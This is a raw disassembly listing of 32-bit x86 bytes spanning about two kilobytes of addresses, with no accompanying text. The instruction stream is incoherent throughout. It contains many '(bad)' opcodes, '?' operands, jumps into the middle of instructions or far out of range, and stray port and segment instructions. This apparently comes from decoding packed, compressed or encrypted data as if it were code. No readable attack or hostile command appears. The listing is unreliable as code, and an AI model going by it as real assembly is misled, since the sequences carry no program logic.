  41701d:	add    BYTE PTR [eax],al
  41701f:	add    BYTE PTR [edx],al
  417021:	mov    dl,0x4b
  417023:	cmp    ecx,DWORD PTR [ebp+esi*4-0x4e01d7cb]
  41702a:	push   ss
  41702b:	add    al,0xf8
  41702d:	mov    esp,0xa3cb2f06
  417032:	fbld   TBYTE PTR [edx]
  417034:	repnz scas eax,DWORD PTR es:[edi]
  417036:	or     al,0x30
  417038:	fst    QWORD PTR [edx+eax*1+0x3a2b32c]
  41703f:	sub    ebp,DWORD PTR [edi-0x4ddcfc6c]
  417045:	mov    ebp,0x658c300c
  41704a:	adc    bl,dh
  41704c:	bound  edx,QWORD PTR [ecx+ebx*8-0x374945da]
  417053:	sub    DWORD PTR [edi-0x4ccb205e],ebp
  417059:	mov    dh,0xc6
  41705b:	das    
  41705c:	scas   eax,DWORD PTR es:[edi]
  41705d:	xchg   esp,eax
  41705e:	xlat   BYTE PTR ds:[ebx]
  41705f:	and    bh,BYTE PTR [edx-0x4a]
  417062:	or     al,cl
  417064:	mov    bh,0x94
  417066:	ja     0x417030
  417068:	mov    ecx,0x8fa179a1
  41706d:	mov    esp,0x9f9f9967
  417072:	or     BYTE PTR [esi+ebp*4-0x687f8560],al
  417079:	xchg   esp,eax
  41707a:	js     0x417004
  41707c:	cwde   
  41707d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41707e:	or     BYTE PTR [eax-0x77983892],cl
	...
  417098:	outs   dx,BYTE PTR ds:[esi]
  417099:	xchg   esp,eax
  41709a:	ds mov ah,0xc3
  41709d:	cmp    bl,BYTE PTR fs:[eax]
  4170a0:	mov    bh,al
  4170a2:	arpl   WORD PTR [eax+0x7a],cx
  4170a5:	mov    al,0x67
  4170a7:	jmp    0x41be2a1d
  4170ac:	imul   esi,DWORD PTR [esi-0x50951693],0xa2b54666
  4170b6:	or     BYTE PTR [ebx+esi*4-0x60],al
  4170ba:	pusha  
  4170bb:	inc    esp
  4170bc:	mov    esi,0xa3177994
  4170c1:	mov    ecx,0xba902078
  4170c6:	imul   ebx,DWORD PTR [edx],0xffffff9f
  4170c9:	scas   eax,DWORD PTR es:[edi]
  4170ca:	imul   ecx,DWORD PTR [eax],0x156ba190
  4170d0:	scas   eax,DWORD PTR es:[edi]
  4170d1:	mov    ecx,0xa4900463
  4170d6:	add    dh,BYTE PTR gs:[ebp-0x45]
  4170da:	dec    DWORD PTR gs:[edi+0x79d664af]
  4170e1:	mov    bl,0x6f
  4170e3:	into   
  4170e4:	fs ja  0x4170ef
  4170e7:	sbb    BYTE PTR [ecx],bl
  4170e9:	jbe    0x417122
  4170eb:	sbb    BYTE PTR [eax-0x29ff8445],dl
  4170f1:	pop    esi
  4170f2:	push   ebp
  4170f3:	outs   dx,BYTE PTR ds:[esi]
  4170f4:	rcl    BYTE PTR [edx+0x62c96560],cl
  4170fa:	popa   
  4170fb:	add    BYTE PTR gs:[eax],al
	...
  41710e:	add    BYTE PTR [eax],al
  417110:	in     eax,0x7c
  417112:	jns    0x417187
  417114:	adc    DWORD PTR [eax+0x66],edi
  417117:	add    bh,bh
  417119:	outs   dx,DWORD PTR ds:[esi]
  41711a:	ja     0x417189
  41711c:	or     al,0x79
  41711e:	imul   eax,DWORD PTR [eax],0x6e55655a
  417124:	add    bh,BYTE PTR [eax+ecx*1+0x74]
  417128:	adc    BYTE PTR [edx+0x7c],ah
  41712b:	imul   ecx,DWORD PTR [ebx],0x3561086e
  417131:	arpl   WORD PTR [ebp+eiz*2-0x5b],sp
  417135:	arpl   WORD PTR [ebp+0x63],bp
  417138:	cmp    eax,0x506c647d
  41713d:	nop
  41713e:	js     0x4171a5
  417140:	inc    esp
  417141:	jae    0x4171ac
  417143:	add    BYTE PTR [esi+0x7d],dl
  417146:	addr16 jb 0x417119
  417149:	ins    BYTE PTR es:[edi],dx
  41714a:	or     BYTE PTR [ecx],dh
  41714c:	jne    0x4171bd
  41714e:	jp     0x4171b1
  417150:	(bad)  
  417151:	jnp    0x41715b
  417153:	ja     0x4170f1
  417155:	fs imul edx,DWORD PTR fs:[ebx+eiz*2+0x75896908],0x757c657e
  417162:	jns    0x417196
  417164:	gs js  0x4171d4
  417167:	arpl   WORD PTR [edx+0x3006964],bx
  41716d:	and    BYTE PTR [ebx],bh
  41716f:	add    esp,DWORD PTR ss:[eax]
  417172:	cmc    
  417173:	ins    BYTE PTR es:[edi],dx
	...
  417188:	push   eax
  417189:	jo     0x4171f9
  41718b:	imul   ebx,DWORD PTR [ebx-0x6e],0x478c616b
  417192:	and    BYTE PTR [ebp-0x53],dh
  417195:	inc    esp
  417196:	or     DWORD PTR [esi-0x67],esp
  417199:	pop    edx
  41719a:	and    dh,BYTE PTR [edi+0x7b]
  41719d:	loopne 0x41719a
  41719f:	jmp    FWORD PTR [edx+ebp*8+0x39]
  4171a3:	push   0x1fe76b
  4171a8:	fs sbb al,0x21
  4171ab:	pop    edi
  4171ac:	je     0x4171ca
  4171ae:	or     DWORD PTR [eax+0x73],esi
  4171b1:	push   cs
  4171b2:	cmp    DWORD PTR [eax],eax
  4171b4:	outs   dx,BYTE PTR ds:[esi]
  4171b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b6:	and    BYTE PTR [ecx+0x5f],dh
  4171b9:	add    al,0x23
  4171bb:	mov    WORD PTR gs:[ecx],ds
  4171be:	and    eax,0x2519345f
  4171c3:	pop    edi
  4171c4:	and    al,0x3b
  4171c6:	cmp    BYTE PTR [edi+0x3f],dh
  4171c9:	retf   
  4171ca:	sub    DWORD PTR [ecx+0x31],esp
  4171cd:	mov    WORD PTR [ebx+ebp*2],cs
  4171d0:	sub    eax,0x316830c7
  4171d5:	mov    esi,0xbd2d610c
  4171da:	sub    DWORD PTR [ebp+ebp*8+0x3b],esp
  4171de:	cmp    BYTE PTR [edi-0x10],ah
  4171e1:	gs sub eax,0x23698c72
  4171e7:	(bad)  
  4171e8:	jmp    0x41a276
	...
  4171fd:	add    BYTE PTR [eax],al
  4171ff:	add    dl,dh
  417201:	xchg   esi,eax
  417202:	cmp    ah,BYTE PTR [ebx-0x26]
  417205:	cwde   
  417206:	cmp    al,BYTE PTR [eax]
  417208:	in     eax,dx
  417209:	mov    ah,BYTE PTR [eax]
  41720b:	data16 jmp 0x417191
  41720e:	or     al,0x72
  417210:	lods   eax,DWORD PTR ds:[esi]
  417211:	call   0x5f37:0x3bb06324
  417218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417219:	and    eax,0x94bb6d27
  41721e:	fbld   TBYTE PTR [edi+ebx*4]
  417221:	mov    ebx,0x949e22db
  417226:	iret   
  417227:	es mov ebx,0x8c37dcb6
  41722d:	mov    dl,0xc0
  41722f:	aaa    
  417230:	ja     0x4171e5
  417232:	lds    eax,FWORD PTR [ebx]
  417234:	ins    DWORD PTR es:[edi],dx
  417235:	mov    ch,0xce
  417237:	sub    BYTE PTR [ebx-0x51],dh
  41723a:	fbld   TBYTE PTR [ecx]
  41723c:	push   ebx
  41723d:	mov    ebx,0x9463269b
  417242:	xchg   edx,eax
  417243:	sub    al,0x6d
  417245:	mov    cl,0x84
  417247:	xor    DWORD PTR [ebx+0x6d2a7494],ebp
  41724d:	mov    ecx,0xb28c3a84
  417252:	cwde   
  417253:	aaa    
  417254:	das    
  417255:	mov    bh,0x84
  417257:	add    esp,DWORD PTR [edi+ebp*4]
  41725a:	jae    0x41728b
  41725c:	and    DWORD PTR [ebx-0x21],esp
  41725f:	es aaa 
  417261:	mov    ebx,0x2745
	...
  417276:	add    BYTE PTR [eax],al
  417278:	aaa    
  417279:	xchg   esp,eax
  41727a:	inc    ebx
  41727b:	and    esp,DWORD PTR ds:0x8c235bb5
  417281:	mov    eax,ds:0xb2eb2f40
  417286:	cmp    ebp,DWORD PTR [ebx+eiz*8]
  417289:	xchg   esp,eax
  41728a:	inc    edx
  41728b:	sub    eax,0x3340a4e7
  417290:	mov    WORD PTR [eax-0x4c08dce8],?
  417296:	add    eax,0xa88c28
  41729b:	cmp    ebp,eax
  41729d:	mov    bl,0x11
  41729f:	add    al,0xea
  4172a1:	mov    bl,0xf1
  4172a3:	ss mov bh,0x94
  4172a6:	sbb    DWORD PTR ds:0xba08b2b4,ebp
  4172ac:	ds push 0x8
  4172af:	sti    
  4172b0:	data16 mov ch,0x60
  4172b3:	enter  0xb85d,0x8
  4172b7:	retf   
  4172b8:	jae    0x417275
  4172ba:	retw   0x6c1e
  4172be:	cmp    ch,cl
  4172c0:	pop    edi
  4172c1:	mov    bh,0x67
  4172c3:	retf   0xb7b7
  4172c6:	jns    0x4172b1
  4172c8:	lods   al,BYTE PTR ds:[esi]
  4172c9:	mov    cl,0x65
  4172cb:	lds    ecx,FWORD PTR [edi-0x47419b46]
  4172d1:	mov    bh,0x7a
  4172d3:	jmp    0x8ea72874
  4172d8:	fwait
  4172d9:	mov    bh,0x7a
  4172db:	jmp    0x4172e0
	...
  4172f0:	lods   eax,DWORD PTR ds:[esi]
  4172f1:	ret    
  4172f2:	data16 mov BYTE PTR [ecx+0x6e9308c3],ah
  4172f9:	scas   eax,DWORD PTR es:[edi]
  4172fa:	imul   edi,DWORD PTR [edx-0x71],0xffffffc3
  4172fe:	jns    0x41728d
  417300:	jno    0x4172c5
  417302:	jns    0x417289
  417304:	imul   edx,DWORD PTR [esi+edi*2+0x65a87350],0x6494615b
  41730f:	inc    esi
  417310:	mov    ax,0x3f65
  417314:	mov    BYTE PTR [ebx+0x3a],dh
  417317:	cli    
  417318:	shr    BYTE PTR [ecx+0x6578e96b],0x39
  41731f:	cli    
  417320:	xor    DWORD PTR [edx+0x8],0x7ac3bc3a
  417327:	sbb    eax,0xe961b7a2
  41732c:	scas   al,BYTE PTR es:[edi]
  41732d:	mov    bh,0x65
  41732f:	sbb    ebp,DWORD PTR [edi-0x5ee9f749]
  417335:	mov    dl,0x66
  417337:	add    BYTE PTR [eax-0x6b92f796],bl
  41733d:	ja     0x4173aa
  41733f:	imul   ecx,DWORD PTR [eax-0x738d8368],0x2c746d6e
  417349:	xchg   edi,eax
  41734a:	arpl   WORD PTR [esi+0x51],bp
  41734d:	jo     0x4173b5
  41734f:	gs and eax,0x333728
	...
  417365:	add    BYTE PTR [eax],al
  417367:	add    BYTE PTR [ecx+edi*2+0x67],al
  41736b:	add    dh,dl
  41736d:	outs   dx,BYTE PTR ds:[esi]
  41736e:	ins    DWORD PTR es:[edi],dx
  41736f:	arpl   si,bx
  417371:	jae    0x4173d9
  417373:	add    bh,cl
  417375:	arpl   WORD PTR [esi+0x69],sp
  417378:	xor    ch,BYTE PTR [ecx+0x8]
  41737b:	arpl   bp,di
  41737d:	push   0x66f5736d
  417382:	push   ebp
  417383:	jae    0x41737b
  417385:	cmp    BYTE PTR gs:[edx+0x9],dh
  417389:	xchg   edi,eax
  41738a:	push   ebp
  41738b:	jne    0x4173d3
  41738d:	jae    0x4173fc
  41738f:	outs   dx,BYTE PTR ds:[esi]
  417390:	mov    ch,0x69
  417392:	js     0x4173f5
  417394:	aaa    
  417395:	jb     0x417414
  417397:	add    BYTE PTR [ebx+eax*4],al
  41739a:	popa   
  41739b:	imul   eax,DWORD PTR [ebx-0x68],0x6c476561
  4173a2:	ins    DWORD PTR es:[edi],dx
  4173a3:	outs   dx,BYTE PTR ds:[esi]
  4173a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173a5:	jne    0x41740a
  4173a7:	outs   dx,DWORD PTR ds:[esi]
  4173a8:	dec    edx
  4173a9:	ins    BYTE PTR es:[edi],dx
  4173aa:	imul   eax,DWORD PTR [eax],0x656d6adb
  4173b0:	shl    DWORD PTR [edi+esi*2+0x0],cl
  4173b4:	int    0x6d
  4173b6:	js     0x41741d
  4173b8:	imul   esp,DWORD PTR gs:[eax+0x61],0xffffff81
  4173bd:	ins    DWORD PTR es:[edi],dx
  4173be:	popa   
  4173bf:	add    BYTE PTR [ebx-0x738b9991],dl
  4173c5:	nop
  4173c6:	and    ah,BYTE PTR [ebx+eiz*8+0x2b]
  4173ca:	sub    eax,0x6d
	...
  4173df:	add    BYTE PTR [ebx-0x5491dc7a],bh
  4173e5:	sub    esp,DWORD PTR [ecx]
  4173e7:	pop    edi
  4173e8:	mov    esi,0x8c772797
  4173ed:	push   ds
  4173ee:	and    BYTE PTR [ebp-0x49],ch
  4173f1:	push   eax
  4173f2:	xor    al,0x0
  4173f4:	pop    ebx
  4173f5:	mov    bh,cl
  4173f7:	xor    al,0x8c
  4173f9:	push   ebp
  4173fa:	and    dh,BYTE PTR [ecx-0x57]
  4173fd:	cmp    esp,DWORD PTR [ecx]
  4173ff:	add    BYTE PTR [eax-0x20],bh
  417402:	sub    eax,0x152b8569
  417407:	addr16 jae 0x41745e
  41740a:	and    eax,0x2c2b605f
  41740f:	add    BYTE PTR [eax+0x3],ah
  417412:	cmp    BYTE PTR [esi+0x68],ch
  417415:	sbb    BYTE PTR [ebx],bh
  417417:	add    BYTE PTR [edi-0x5],bl
  41741a:	and    esi,DWORD PTR [edx+0x65]
  41741d:	pop    es
  41741e:	or     DWORD PTR [edx+0x2d],esp
  417421:	or     DWORD PTR ds:0x282b3867,edx
  417427:	outs   dx,BYTE PTR ds:[esi]
  417428:	inc    eax
  417429:	adc    BYTE PTR [ebx],bh
  41742b:	add    BYTE PTR ds:0x3b6825a1,ch
  417431:	leave  
  417432:	xor    DWORD PTR [eax],eax
  417434:	das    
  417435:	sar    BYTE PTR [esi],cl
  417437:	jbe    0x41746a
  417439:	mov    edi,0xd38c6338
  41743e:	pop    ds
  41743f:	popa   
  417440:	not    eax
  417442:	xor    DWORD PTR [eax],eax
	...
  417458:	cld    
  417459:	shl    BYTE PTR [edi],cl
  41745b:	arpl   si,di
  41745d:	sub    ebp,DWORD PTR [ebx]
  41745f:	arpl   dx,sp
  417461:	aad    0x29
  417463:	imul   esi,ebp,0xffffff94
  417466:	sbb    eax,0x6b0eb04
  41746b:	xor    ch,bh
  41746d:	fwait
  41746e:	push   cs
  41746f:	das    
  417470:	jae    0x417406
  417472:	shl    BYTE PTR [edx],1
  417474:	jle    0x41741f
  417476:	mov    dl,0x1e
  417478:	mov    WORD PTR [edx-0x5950cbe8],gs
  41747e:	fbld   TBYTE PTR [eax]
  417480:	scas   eax,DWORD PTR es:[edi]
  417481:	mov    dl,0xc
  417483:	xor    eax,0x2cdfa5b3
  417488:	mov    dl,0xab
  41748a:	into   
  41748b:	sub    esp,DWORD PTR [eax-0x50cf2f6c]
  417491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417492:	fstp   TBYTE PTR [edx]
  417494:	mov    ebx,0x6f35c294
  417499:	mov    bl,0xbb
  41749b:	sub    al,BYTE PTR [edx+0x6121dfb7]
  4174a1:	mov    cl,0xc1
  4174a3:	and    bl,BYTE PTR [esi-0x6c]
  4174a6:	sbb    BYTE PTR [edi],0x6b
  4174a9:	mov    eax,0xa68c3480
  4174ae:	mov    gs,WORD PTR [edi]
  4174b0:	imul   ebp,DWORD PTR [edi-0x4fc2fc78],0xffffff80
  4174b7:	cmp    ch,BYTE PTR [edi]
  4174b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ba:	fbstp  TBYTE PTR [eax]
	...
  4174d0:	xor    esp,DWORD PTR [ebp-0x6bd8d77d]
  4174d6:	outs   dx,DWORD PTR ds:[esi]
  4174d7:	xor    eax,0x1f52ab4b
  4174dc:	mov    WORD PTR [esi-0x49ddda99],ds
  4174e2:	dec    ebp
  4174e3:	daa    
  4174e4:	mov    WORD PTR [ebp-0x4600d8c0],fs
  4174ea:	pop    ebx
  4174eb:	add    al,0xf7
  4174ed:	lods   eax,DWORD PTR ds:[esi]
  4174ee:	pop    edx
  4174ef:	pop    ds
  4174f0:	mov    WORD PTR [eax-0x4f5bb7f8],?
  4174f6:	cmp    dl,BYTE PTR [bx+si+0x7ab9]
  4174fb:	or     al,0x83
  4174fd:	scas   al,BYTE PTR es:[edi]
  4174fe:	or     BYTE PTR ds:0x1d7ca57b,dl
  417504:	jae    0x4174ab
  417506:	jl     0x4174f1
  417508:	jb     0x4174c9
  41750a:	jle    0x417518
  41750c:	jp     0x4174c5
  41750e:	imul   edx,DWORD PTR [edx],0xc66b190
  417514:	fs mov cl,0x7e
  417517:	add    al,0x90
  417519:	mov    eax,0xb876df67
  41751e:	or     ah,cl
  417520:	push   esi
  417521:	mov    al,0x65
  417523:	fbstp  TBYTE PTR [edx-0x6c]
  417526:	imul   eax,ecx,0xd169a2ba
  41752c:	(bad)  
  41752d:	mov    dh,0x7a
  41752f:	rcr    BYTE PTR [edx+0xe96cae],1
	...
  417545:	add    BYTE PTR [eax],al
  417547:	add    BYTE PTR [ecx+esi*4-0x4c741694],ch
  41754e:	jns    0x4174ed
  417550:	mov    dh,0xae
  417552:	outs   dx,DWORD PTR ds:[esi]
  417553:	jmp    0x8ca826fd
  417558:	(bad)  
  417559:	stos   DWORD PTR es:[edi],eax
  41755a:	pop    edi
  41755b:	mov    al,BYTE PTR [ecx+0x6d9679b1]
  417561:	test   al,0x8
  417563:	mov    ebx,0xbb3a65c1
  417568:	mov    ecx,0x7174671f
  41756d:	mov    dl,0x64
  41756f:	dec    esp
  417570:	pop    edi
  417571:	xchg   esp,eax
  417572:	aaa    
  417573:	sbb    BYTE PTR [ecx-0x66e7c892],ah
  417579:	outs   dx,BYTE PTR ds:[esi]
  41757a:	or     BYTE PTR [edx-0x4d],cl
  41757d:	mov    ch,0x67
  41757f:	add    dh,dl
  417581:	ja     0x4175e7
  417583:	popa   
  417584:	gs ins DWORD PTR es:[edi],dx
  417586:	arpl   WORD PTR [edx-0x3f],si
  417589:	jns    0x4175f1
  41758b:	xor    ah,BYTE PTR [esi-0x6d]
  41758e:	ins    DWORD PTR es:[edi],dx
  41758f:	ins    BYTE PTR es:[edi],dx
  417590:	jp     0x417600
  417592:	imul   esp,DWORD PTR [edi-0x76],0x8a660874
  417599:	ja     0x417617
  41759b:	bound  edx,QWORD PTR [esp+ebp*2+0x77353164]
  4175a2:	arpl   WORD PTR [esi-0x64],si
  4175a5:	jbe    0x417612
  4175a7:	add    BYTE PTR [ebx+0x687c79],cl
	...
  4175bd:	add    BYTE PTR [eax],al
  4175bf:	add    BYTE PTR [esi+esi*2+0x6c386508],dl
  4175c6:	push   ebp
  4175c7:	outs   dx,BYTE PTR ds:[esi]
  4175c8:	inc    eax
  4175c9:	je     0x41762f
  4175cb:	add    BYTE PTR [esi],dh
  4175cd:	jb     0x417632
  4175cf:	outs   dx,DWORD PTR ds:[esi]
  4175d0:	xlat   BYTE PTR ds:[ebx]
  4175d1:	pop    edi
  4175d2:	or     BYTE PTR [esi+0x40],ah
  4175d5:	jb     0x417636
  4175d7:	outs   dx,DWORD PTR ds:[esi]
  4175d8:	rol    DWORD PTR [eax+0x6bc47308],cl
  4175de:	popa   
  4175df:	jns    0x4175d6
  4175e1:	imul   edx,DWORD PTR [ebp+0x78],0x2
  4175e5:	je     0x41764b
  4175e7:	ins    BYTE PTR es:[edi],dx
  4175e8:	in     eax,0x6c
  4175ea:	push   ebp
  4175eb:	jae    0x4175f7
  4175ed:	jns    0x4175f7
  4175ef:	push   0x4a
  4175f1:	imul   esp,DWORD PTR [esi+0x0],0x4
  4175f5:	push   0x73f6773a
  4175fa:	cmp    al,0x72
  4175fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175fd:	je     0x417654
  4175ff:	bound  ebx,QWORD PTR [ebx+edx*4]
  417602:	jp     0x417669
  417604:	push   ecx
  417605:	sub    DWORD PTR [edi],esi
  417607:	xor    esp,DWORD PTR [ebp-0x739e9b8c]
  41760d:	retf   
  41760e:	and    BYTE PTR [edi-0x74],bl
  417611:	mov    ebx,0xcaf2673a
  417616:	daa    
  417617:	add    ch,bh
  417619:	data16 daa 
  41761b:	jb     0x417615
  41761d:	sub    ebp,DWORD PTR [edx]
  41761f:	push   0x63395ff1
	...
  417638:	in     eax,dx
  417639:	sub    edi,eax
  41763b:	xor    ah,BYTE PTR [ecx-0x130007b8]
  417641:	xchg   ebp,eax
  417642:	adc    eax,0x93cb863
  417647:	push   0x611519ad
  41764c:	stos   DWORD PTR es:[edi],eax
  41764d:	sbb    DWORD PTR [eax],ebp
  41764f:	add    BYTE PTR [eax-0x4e8bcb70],ch
  417655:	sbb    DWORD PTR [ecx],ecx
  417657:	jno    0x417606
  417659:	cmp    eax,0x7c8c6428
  41765e:	sti    
  41765f:	xor    DWORD PTR [esi+0x7a],ebx
  417662:	stc    
  417663:	push   DWORD PTR [ebx+0x4c]
  417666:	sub    eax,0x1f2b736c
  41766b:	pop    edi
  41766c:	jg     0x417649
  41766e:	daa    
  41766f:	jb     0x4175fd
  417671:	dec    edi
  417672:	sub    al,0x6e
  417674:	jne    0x4176ce
  417676:	sub    eax,0x222b696c
  41767b:	addr16 pusha 
  41767d:	pop    es
  41767e:	sub    BYTE PTR [esi-0x74],ch
  417681:	or     ch,BYTE PTR [ecx+esi*2]
  417684:	aas    
  417685:	adc    al,0x28
  417687:	add    BYTE PTR [edi],bh
  417689:	lahf   
  41768a:	sub    BYTE PTR [eax+ebp*1+0xc],ch
  41768e:	or     DWORD PTR [eax+0x3e],esi
  417691:	or     al,0x34
  417693:	arpl   WORD PTR [esi],bx
  417695:	sub    esp,DWORD PTR [ecx]
  417697:	ins    DWORD PTR es:[edi],dx
  417698:	sbb    BYTE PTR [ebx+eax*2+0x25],dl
	...
  4176af:	add    BYTE PTR [ecx],dh
  4176b1:	xchg   esp,eax
  4176b2:	pop    esi
  4176b3:	sub    esp,DWORD PTR [edx]
  4176b5:	mov    eax,0x94fd2d4e
  4176ba:	xor    al,0x2f
  4176bc:	std    
  4176bd:	test   al,0x43
  4176bf:	sub    ebp,edi
  4176c1:	xchg   esp,eax
  4176c2:	dec    esi
  4176c3:	and    edi,eax
  4176c5:	mov    bh,0x32
  4176c7:	add    al,0xee
  4176c9:	stos   DWORD PTR es:[edi],eax
  4176ca:	xor    ebp,DWORD PTR [eax]
  4176cc:	jmp    0xdd608a84
  4176d1:	xchg   esp,eax
  4176d2:	push   cs
  4176d3:	sub    al,0xee
  4176d5:	mov    eax,0xb58c2613
  4176da:	or     eax,0x1ca9b62c
  4176df:	add    al,0x6b
  4176e1:	bound  esi,QWORD PTR [edx-0x49998111]
  4176e7:	sti    
  4176e8:	bound  esp,QWORD PTR [edi+ebx*8+0x3]
  4176ec:	scas   eax,DWORD PTR es:[edi]
  4176ed:	test   al,0xea
  4176ef:	xor    DWORD PTR [edx-0x5dce3957],esp
  4176f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f6:	aam    0x3
  4176f8:	je     0x4176a2
  4176fa:	(bad)  [ebx]
  4176fc:	(bad)  
  4176fd:	ins    DWORD PTR es:[edi],dx
  4176fe:	push   ds
  4176ff:	repz rcr DWORD PTR [ebp+eax*1-0xd],0xbf
  417705:	push   0x6ea3f10d
  41770a:	lock repz sahf 
  41770d:	pop    edx
  41770e:	out    0xf3,eax
  417710:	mov    ds:0x1dc664,eax
	...
  417725:	add    BYTE PTR [eax],al
  417727:	add    BYTE PTR [ecx-0x5e],ah
  41772a:	xchg   esp,eax
  41772b:	es jns 0x4176d4
  41772e:	mov    BYTE PTR [esi],bl
  417730:	cmp    DWORD PTR [eax-0x4ecccc62],ebp
  417736:	lds    esi,FWORD PTR [ebx]
  417738:	and    al,0xa4
  41773a:	or     cl,ch
  41773c:	ja     0x4176e6
  41773e:	jl     0x4177b9
  417740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417741:	outs   dx,DWORD PTR ds:[esi]
  417742:	and    eax,0x5fa46f4a
  417747:	push   ebp
  417748:	arpl   WORD PTR [eax-0x4853a59b],si
  41774e:	es dec edx
  417750:	test   eax,0x800132af
  417755:	cmp    BYTE PTR fs:[esi],cl
  417758:	xchg   edx,eax
  417759:	test   eax,0x69b33c7a
  41775e:	jle    0x4177a0
  417760:	and    DWORD PTR [ecx-0x4c5fe984],0x69
  417767:	iret   
  417768:	lahf   
  417769:	lods   al,BYTE PTR ds:[esi]
  41776a:	js     0x417755
  41776c:	(bad)  
  41776d:	lods   al,BYTE PTR ds:[esi]
  41776e:	jl     0x417785
  417770:	js     0x4177d0
  417772:	and    eax,0x7eb373d6
  417777:	adc    BYTE PTR [edx-0x4f],ch
  41777a:	pusha  
  41777b:	or     al,0x5e
  41777d:	mov    dh,0x67
  41777f:	std    
  417780:	jbe    0x417734
  417782:	imul   edx,DWORD PTR [edi],0x6d
  417785:	test   eax,0xaf1d0e63
  41778a:	jp     0x41779d
	...
  4177a0:	scas   al,BYTE PTR es:[edi]
  4177a1:	push   0x6b
  4177a3:	shl    DWORD PTR [edx-0x54429f6c],1
  4177a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177aa:	xor    cl,BYTE PTR [esi]
  4177ac:	jmp    0xf205df55
  4177b1:	mov    al,0x6b
  4177b3:	mov    ebx,0x9779a980
  4177b8:	jp     0x41775a
  4177ba:	mov    ch,BYTE PTR es:[eax+0x6ca125af]
  4177c1:	enter  0xbf3e,0xa2
  4177c5:	pushf  
  4177c6:	imul   eax,DWORD PTR [eax],0xffffffa5
  4177c9:	outs   dx,DWORD PTR ds:[esi]
  4177ca:	jl     0x417840
  4177cc:	xor    eax,0xe42f241d
  4177d1:	push   ds
  4177d2:	cmp    eax,0x3828e42e
  4177d7:	cs ja  0x4177fd
  4177da:	cmp    eax,0x241d742e
  4177df:	jp     0x4177be
  4177e1:	mov    edi,0x6ddd6526
  4177e6:	or     BYTE PTR [eax],al
  4177e8:	lods   al,BYTE PTR ds:[esi]
  4177e9:	mov    ebp,0xcc9a504d
  4177ee:	dec    esi
  4177ef:	dec    ecx
  4177f0:	mov    cl,0xcd
  4177f2:	cmp    BYTE PTR [ecx+0x78],bl
  4177f5:	pop    ecx
  4177f6:	pop    eax
  4177f7:	dec    ebx
  4177f8:	test   eax,0xa84c4dce
  4177fd:	and    BYTE PTR [esi+0x55],bl
  417800:	ins    BYTE PTR es:[edi],dx
  417801:	rcr    DWORD PTR [edx+0x59],cl
	...
  417818:	test   DWORD PTR [ecx+ecx*2+0x59c7f544],edi
  41781f:	dec    ecx
  417820:	hlt    
  417821:	xor    al,0x25
  417823:	add    BYTE PTR ds:0x37000897,dh
  417829:	xchg   edi,eax
  41782a:	inc    ecx
  41782b:	dec    edi
  41782c:	jmp    0x25426dec
  417831:	xchg   edi,eax
  417832:	or     BYTE PTR [eax],al
  417834:	cmc    
  417835:	xchg   esi,eax
  417836:	or     BYTE PTR [eax],al
  417838:	inc    esi
  417839:	(bad)  
  41783a:	dec    esi
  41783b:	push   esp
  41783c:	sbb    dl,al
  41783e:	pop    edx
  41783f:	inc    ebp
  417840:	adc    esp,edx
  417842:	ins    DWORD PTR es:[edi],dx
  417843:	arpl   WORD PTR [edi],sp
  417845:	jbe    0x4178be
  417847:	outs   dx,DWORD PTR ds:[esi]
  417848:	retf   
  417849:	bound  edx,QWORD PTR [edi+edx*2-0x4]
  41784d:	je     0x4178bb
  41784f:	outs   dx,DWORD PTR ds:[esi]
  417850:	cli    
  417851:	popa   
  417852:	push   esp
  417853:	inc    ebx
  417854:	mov    eax,?
  417856:	cmp    dh,BYTE PTR [edx+0x29]
  417859:	fwait
  41785a:	cmp    eax,0x3e9f3156
  41785f:	and    ecx,DWORD PTR [bp+di]
  417862:	inc    ebp
  417863:	push   ebx
  417864:	cmp    dl,BYTE PTR [edi+eiz*1]
  417867:	jno    0x417881
  417869:	or     al,0x15
  41786b:	ins    BYTE PTR es:[edi],dx
  41786c:	mov    WORD PTR [eax+0x2a],ds
  41786f:	and    bh,BYTE PTR [bp+0x5f30]
  417874:	clc    
  417875:	iret   
  417876:	pop    ebp
  417877:	je     0x417877
  417879:	aam    0x2a
  41787b:	add    BYTE PTR gs:[eax],al
	...
  41788e:	add    BYTE PTR [eax],al
  417890:	mov    WORD PTR [edi+0x13],fs
  417893:	jno    0x417891
  417895:	(bad)  
  417896:	sub    esi,DWORD PTR [edi-0x26]
  417899:	int3   
  41789a:	daa    
  41789b:	arpl   WORD PTR [edi+eax*4+0x2b8c000c],cx
  4178a2:	or     DWORD PTR [eax],eax
  4178a4:	mov    WORD PTR [ebx],gs
  4178a6:	or     DWORD PTR [esi],ebp
  4178a8:	mov    cl,0x83
  4178aa:	pop    ds
  4178ab:	add    bh,bl
  4178ad:	sbb    bl,BYTE PTR [edi]
  4178af:	je     0x417874
  4178b1:	mov    WORD PTR [esi],?
  4178b3:	arpl   ax,dx
  4178b5:	adc    BYTE PTR [ebx],0x6e
  4178b8:	mov    esi,0xb3005e6c
  4178bd:	sbb    esp,DWORD PTR [eax]
  4178bf:	outs   dx,BYTE PTR ds:[esi]
  4178c0:	mov    WORD PTR [ecx+ecx*1],gs
  4178c3:	add    BYTE PTR [edi+eax*2],cl
  4178c6:	and    BYTE PTR [edx+0x7a],dh
  4178c9:	dec    eax
  4178ca:	adc    eax,0x2d19be31
  4178cf:	ins    BYTE PTR es:[edi],dx
  4178d0:	push   0x5f54522b
  4178d5:	repnz pop ds
  4178d7:	je     0x417926
  4178d9:	dec    esi
  4178da:	cmp    eax,0x4e505a67
  4178df:	ins    DWORD PTR es:[edi],dx
  4178e0:	push   0xffffff94
  4178e2:	xchg   edx,eax
  4178e3:	and    ah,BYTE PTR [eax-0x51]
  4178e6:	mov    dl,0x28
  4178e8:	cmp    eax,0x322288a5
  4178ed:	retf   
  4178ee:	mov    eax,DWORD PTR [ebx]
  4178f0:	pop    esp
  4178f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178f2:	sahf   
